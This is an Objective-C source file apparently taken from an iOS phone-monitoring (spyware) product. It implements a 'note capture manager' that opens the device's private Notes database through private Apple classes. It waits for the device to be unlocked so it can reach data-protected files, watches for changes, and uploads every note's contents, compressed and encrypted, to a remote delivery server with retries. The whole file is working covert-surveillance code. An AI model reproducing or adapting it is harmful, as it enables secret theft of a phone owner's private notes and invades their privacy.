//
//  NoteManagerImpl.m
//  NoteManager
//
//  Created by Ophat on 1/16/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "NoteManagerImpl.h"
#import "NoteContext.h"
#import "NoteEventNotifier.h"
#import "NoteDeliveryDelegate.h"
#import "NoteDataProvider.h"

#import "SendNote.h"

#import "DeliveryRequest.h"
#import "DeliveryResponse.h"
#import "DataDelivery.h"

#import "MCPasscodeManager.h"

#import <CoreData/NSManagedObjectContext.h>
#import <CoreData/NSPersistentStoreCoordinator.h>
#import <objc/runtime.h>
#import <notify.h>

#define kNoteDatabaseURL				@"file://localhost/var/mobile/Library/Notes/notes.sqlite"

@interface NoteManagerImpl (private)
- (DeliveryRequest*) noteRequest;
- (void)noteDidChange;
- (void) registerDataProtectedAvailable;
- (void) unregisterDataProtectedAvailable;
@end

@implementation NoteManagerImpl

@synthesize mNoteContext;

-(id)initWithDDM:(id<DataDelivery>)aDataDelivery{
	if ((self = [super init])) {
		DLog(@"Note capture manager allocated...");
		
		mDDM = aDataDelivery;
		
        @try {
            MCPasscodeManager *mcPasscodeManager = [MCPasscodeManager sharedManager];
            if ([mcPasscodeManager isDeviceLocked]) { // Locked with passcode
                DLog(@"Device locked with passcode, cannot allocate NoteContext object at this time");
                
                [self registerDataProtectedAvailable];
                
            } else {
                DLog(@"Create NoteContext now");
                
                [self createNoteContext];
            }
        }
        @catch (NSException *exception) {
            DLog(@"Note data protected exception, %@", exception);
            
            [self registerDataProtectedAvailable];
        }
        @finally {
            ;
        }
		
		mNoteEventNotifier = [[NoteEventNotifier alloc] init];
		[mNoteEventNotifier setMNoteChangeDelegate:self];
		[mNoteEventNotifier setMNoteChangeSelector:@selector(noteDidChange)];
		
		mNoteDataProvider = [[NoteDataProvider alloc] init];
		//[mNoteDataProvider setMNoteContext:mNoteContext];			// Move the code to initiate NoteContext to provider to get the updated note entries
		
		if ([mDDM isRequestPendingForCaller:kDDC_NoteManager]) {
			DLog(@"Register caller ID with DDM");
			[mDDM registerCaller:kDDC_NoteManager withListener:self];
		}
	}
	return (self);
}


- (void) startCapture {
	[mNoteEventNotifier start];
}

- (void) stopCapture {
	[mNoteEventNotifier stop];
}

-(BOOL) deliverNote:(id<NoteDeliveryDelegate>)aNoteDeliveryDelegate{
	DLog(@"deliverNote, aNoteDeliveryDelegate = %@", aNoteDeliveryDelegate)
	BOOL canProcess = NO;
	DeliveryRequest* request = [self noteRequest];
	if (![mDDM isRequestIsPending:request]) {
		DLog (@"not pending")
		// SendNote is in ProtocolBuider
		SendNote* sendNote = [mNoteDataProvider commandData];
		[request setMCommandCode:[sendNote getCommand]];
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:sendNote];
		[request setMDeliveryListener:self];
		[mDDM deliver:request];
		
		mDelegate = aNoteDeliveryDelegate;				// set delegate
		
		canProcess = YES;
	}
	return canProcess;
}

- (void) requestFinished: (DeliveryResponse*) aResponse{
	id <NoteDeliveryDelegate> delegate = mDelegate;
	mDelegate = nil;
	
	NSError *error = nil;
	if (![aResponse mSuccess]) {
		NSDictionary *userInfo = [NSDictionary dictionaryWithObject:aResponse forKey:@"DeliveryResponse"];
		error = [NSError errorWithDomain:@"Send note failed" code:[aResponse mStatusCode] userInfo:userInfo];
	}
	
	if ([delegate respondsToSelector:@selector(noteDidDelivered:)]) {
		[delegate performSelector:@selector(noteDidDelivered:) withObject:error];
	}
}

- (void) updateRequestProgress: (DeliveryResponse*) aResponse{
	// NO IMIMPLEMENTATION
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) createNoteContext {
    
    Class $NoteContext = objc_getClass("NoteContext");
    NoteContext *noteContext = [[$NoteContext alloc] init];
    
    NSURL *url = [NSURL URLWithString:kNoteDatabaseURL];
    
    NSPersistentStoreCoordinator *psc = nil;
    
    if ([noteContext respondsToSelector:@selector(persistentStoreCoordinator)]) {
        psc = [noteContext persistentStoreCoordinator];
    }
    else {//iOS 9.3
        psc = [$NoteContext persistentStoreCoordinator];
    }
    
    [psc persistentStoreForURL:url];
    [psc setURL:url forPersistentStore:[[psc persistentStores] objectAtIndex:0]];
    
    [self setMNoteContext:noteContext];
}

- (DeliveryRequest*) noteRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_NoteManager];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:4];                       // For info about constant check EDM
    [request setMEDPType:kEDPTypeSendNote];
    [request setMRetryTimeout:60];
    [request setMConnectionTimeout:2*60];
	[request autorelease];
	return request;
}

- (void) noteDidChange {
	[self deliverNote:mDelegate];
}

- (void) registerDataProtectedAvailable {
    __block int token = 0;
    __block NoteManagerImpl *noteManagerImpl = self;
    __block NSThread *myThread = [NSThread currentThread];
    uint32_t result = notify_register_dispatch("com.apple.springboard.lockstate",
                                               &token,
                                               dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0l),
                                               ^(int arg) {
                                                   DLog(@"Data protected become available after device first unlock");
                                                   
                                                   uint64_t state = 0; // 1 = locked, 0 = unlocked; regardless of passcode
                                                   notify_get_state(token, &state);
                                                   DLog(@"token %d, state %llu", token, state);
                                                   
                                                   if (state == 0) {
                                                       [self performSelector:@selector(createNoteContext)
                                                                    onThread:myThread
                                                                  withObject:nil
                                                               waitUntilDone:YES];
                                                       
                                                       [noteManagerImpl unregisterDataProtectedAvailable];
                                                   }
                                               });
    if (result != NOTIFY_STATUS_OK) {
        DLog(@"Notify register dispatch result, %d", result);
    }
    mDispatchToken = token;
    DLog(@"Done register for data protected available with lockstate, %d", mDispatchToken);
}

- (void) unregisterDataProtectedAvailable {
    DLog(@"Unregister data protected available with lockstate, %d", mDispatchToken);
    if (mDispatchToken != 0) {
        notify_cancel(mDispatchToken);
        mDispatchToken = 0;
    }
}

- (void) dealloc {
    [self unregisterDataProtectedAvailable];
	[self stopCapture];
	[mNoteDataProvider release];
	[mNoteEventNotifier release];
	[mNoteContext release];
	[super dealloc];
}

@end
